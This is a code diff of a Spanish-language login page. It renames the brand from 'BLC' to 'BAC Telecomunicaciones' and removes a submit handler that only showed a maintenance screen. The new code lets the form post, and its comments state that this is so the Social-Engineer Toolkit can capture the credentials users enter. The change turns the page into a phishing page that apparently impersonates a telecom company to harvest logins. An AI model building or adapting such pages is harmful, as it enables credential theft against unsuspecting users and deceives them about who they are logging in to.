@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Inicio de sesión</title>
   <link rel="icon" href="logo.png" type="image/png" />
-  <meta name="description" content="BLC Telecomunicaciones — Acceso al módulo demo." />
+  <meta name="description" content="BAC Telecomunicaciones — Acceso al módulo demo." />
   <meta name="robots" content="noindex,nofollow" />
   <style>
     /* ====== Variables base ====== */
@@ -83,8 +83,8 @@
     <div class="decor"><div class="orb tl"></div><div class="orb br"></div></div>
     <main class="card" role="main" aria-labelledby="titulo">
       <div class="brand">
-        <img class="logo" src="logo.png" alt="Logo BLC Telecomunicaciones" />
-        <div class="name">BLC Telecomunicaciones</div>
+        <img class="logo" src="logo.png" alt="Logo BAC Telecomunicaciones" />
+        <div class="name">BAC Telecomunicaciones</div>
       </div>
 
       <h1 id="titulo" class="title">Bienvenido</h1>
@@ -163,17 +163,10 @@
       document.title = 'Inicio de sesión';
     }
 
-    // Al enviar, SIEMPRE ir a mantenimiento (sin perder UI ni estilos)
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      // Si lo deseas, aquí puedes simular almacenamiento de sesión:
-      // sessionStorage.setItem('user', document.getElementById('usuario').value || '');
-      showMaint();
-    });
-
-    // Permite abrir directamente #mantenimiento en la URL (opcional)
-    if (location.hash === '#mantenimiento') showMaint();
+    // Submit: permitir POST para que SET capture credenciales
+const form = document.getElementById('loginForm');
+// (Sin e.preventDefault) — SET reescribirá action="" a post.php al servir la página
+if (location.hash === '#mantenimiento') showMaint();
   </script>
 </body>
 </html>
